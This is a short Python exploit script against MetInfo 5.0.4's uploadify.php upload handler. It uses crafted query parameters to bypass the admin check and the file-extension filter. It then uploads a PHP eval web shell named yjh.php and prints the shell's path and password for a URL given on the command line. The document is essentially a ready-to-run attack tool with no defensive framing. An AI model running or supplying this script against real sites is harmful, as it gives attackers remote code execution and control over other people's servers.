
import requests
import sys


banner = """

   _____.__.__                                .__                    .___
_/ ____\__|  |   ____            __ ________ |  |   _________     __| _/
\   __\|  |  | _/ __ \   ______ |  |  \____ \|  |  /  _ \__  \   / __ | 
 |  |  |  |  |_\  ___/  /_____/ |  |  /  |_> >  |_(  <_> ) __ \_/ /_/ | 
 |__|  |__|____/\___  >         |____/|   __/|____/\____(____  /\____ | 
                    \/                |__|                   \/      \/ 

Authon : s
usage  : python3 *.py
"""

description = """
admin/include/uploadify.php?metinfo_admin_id=aaa&metinfo_admin_pass=bbb&met_admin_table=met_admin_table%23&type=upfile&met_file_format=jpg|pphphp
"""
headers = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0"
}

def attack(url):
    payload= "/admin/include/uploadify.php?metinfo_admin_id=aaa&metinfo_admin_pass=bbb&met_admin_table=met_admin_table%23&type=upfile&met_file_format=jpg|pphphp"

    full_url = url + payload

    files = {
        'Filedata' :('yjh.php',"<?php @eval($_REQUEST[777];)?>","image/png")
    }

    res = requests.post(url = full_url , headers = headers , files = files)

    # return res.text
    
    return f"Shell Path: {url}{res.text[4:]} Pase:777"


if __name__ == "__main__":
    if len(sys.argv)<2:
        print(banner)
        exit()

    url = sys.argv[1]
    # url = "http://10.9.69.246/MetInfo5.0.4"

    print(attack(url))